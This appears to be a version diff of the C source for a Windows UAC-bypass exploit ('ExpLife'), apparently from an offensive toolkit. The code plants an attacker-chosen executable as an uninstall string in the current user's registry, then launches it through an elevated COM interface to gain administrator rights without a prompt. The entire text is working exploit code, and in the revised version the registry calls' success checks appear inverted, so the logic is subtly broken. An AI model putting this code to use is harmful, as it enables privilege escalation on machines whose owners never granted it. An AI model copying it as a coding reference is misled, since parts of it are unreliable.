@@ -4,9 +4,9 @@
 *
 *  TITLE:       EXPLIFE.C
 *
-*  VERSION:     2.90
+*  VERSION:     3.00
 *
-*  DATE:        19 July 2018
+*  DATE:        27 Aug 2018
 *
 *  ExpLife UAC bypass using IARPUninstallStringLauncher.
 *  For description please visit original URL
@@ -32,43 +32,24 @@ BOOL ucmMasqueradedAPRLaunchFile(
     _In_ LPWSTR lpszFileGuid
 )
 {
-    BOOL                         bCond = FALSE;
     HRESULT                      r = E_FAIL;
-    IID                          xIID_IARPUninstallStringLauncher;
-    CLSID                        xCLSID_IARPUninstallStringLauncher;
     IARPUninstallStringLauncher *USLauncher = NULL;
 
-    do {
+    r = ucmAllocateElevatedObject(
+        T_CLSID_UninstallStringLauncher,
+        &IID_IARPUninstallStringLauncher,
+        CLSCTX_LOCAL_SERVER,
+        &USLauncher);
 
-        if (lpszFileGuid == NULL)
-            break;
+    if ((SUCCEEDED(r)) && (USLauncher)) {
 
-        if (CLSIDFromString(T_CLSID_UninstallStringLauncher, 
-            &xCLSID_IARPUninstallStringLauncher) != NOERROR)
-            break;
+        r = USLauncher->lpVtbl->LaunchUninstallStringAndWait(
+            USLauncher,
+            0,
+            lpszFileGuid,
+            FALSE,
+            NULL);
 
-        if (IIDFromString(T_IID_IARPUninstallStringLauncher, 
-            &xIID_IARPUninstallStringLauncher) != S_OK)
-            break;
-
-        r = CoCreateInstance(&xCLSID_IARPUninstallStringLauncher, NULL,
-            CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER,
-            &xIID_IARPUninstallStringLauncher, &USLauncher);
-
-        if (r != S_OK)
-            break;
-
-        r = ucmMasqueradedCoGetObjectElevate(T_CLSID_UninstallStringLauncher,
-            CLSCTX_LOCAL_SERVER, &xIID_IARPUninstallStringLauncher, &USLauncher);
-        if (r != S_OK)
-            break;
-
-        r = USLauncher->lpVtbl->LaunchUninstallStringAndWait(USLauncher, 
-            0, lpszFileGuid, FALSE, NULL);
-
-    } while (bCond);
-
-    if (USLauncher != NULL) {
         USLauncher->lpVtbl->Release(USLauncher);
     }
 
@@ -89,48 +70,52 @@ BOOL ucmUninstallLauncherMethod(
     _In_ LPWSTR lpszExecutable
 )
 {
-    BOOL        bResult = FALSE, bCond = FALSE;
+    BOOL        bResult = FALSE;
+    HRESULT     hr_init;
     SIZE_T      cbData;
     HKEY        hKey = NULL;
-    LRESULT     lResult;
     GUID        guid;
     WCHAR       szKeyName[MAX_PATH], szGuid[64];
 
-    do {
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
-        if (lpszExecutable == NULL)
-            break;
-
-        if (CoCreateGuid(&guid) != S_OK)
-            break;
+    if (CoCreateGuid(&guid) == S_OK) {
 
         _strcpy(szKeyName, T_UNINSTALL);
         if (StringFromGUID2(&guid, szGuid, sizeof(szGuid) / sizeof(WCHAR))) {
+
             _strcat(szKeyName, szGuid);
+            if (RegCreateKeyEx(
+                HKEY_CURRENT_USER,
+                szKeyName,
+                0,
+                NULL,
+                REG_OPTION_NON_VOLATILE,
+                MAXIMUM_ALLOWED,
+                NULL,
+                &hKey,
+                NULL))
+            {
+                cbData = (1 + _strlen(lpszExecutable)) * sizeof(WCHAR);
+                if (RegSetValueEx(
+                    hKey,
+                    T_UNINSTALL_STRING,
+                    0,
+                    REG_SZ,
+                    (BYTE*)lpszExecutable,
+                    (DWORD)cbData))
+                {
+                    bResult = ucmMasqueradedAPRLaunchFile(szGuid);
+                }
 
-            lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
-                szKeyName, 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
-
-            if (lResult != ERROR_SUCCESS)
-                break;
-
-            cbData = (1 + _strlen(lpszExecutable)) * sizeof(WCHAR);
-            lResult = RegSetValueEx(hKey, T_UNINSTALL_STRING, 0, REG_SZ, (BYTE*)lpszExecutable,
-                (DWORD)cbData);
-
-            if (lResult != ERROR_SUCCESS)
-                break;
-
-            bResult = ucmMasqueradedAPRLaunchFile(szGuid);
+                RegCloseKey(hKey);
+                RegDeleteKey(HKEY_CURRENT_USER, szKeyName);
+            }
         }
-
-    } while (bCond);
-
-    if (hKey != NULL) {
-        RegCloseKey(hKey);
-        RegDeleteKey(HKEY_CURRENT_USER, szKeyName);
     }
 
-    return bResult;
+    if (hr_init == S_OK)
+        CoUninitialize();
 
+    return bResult;
 }
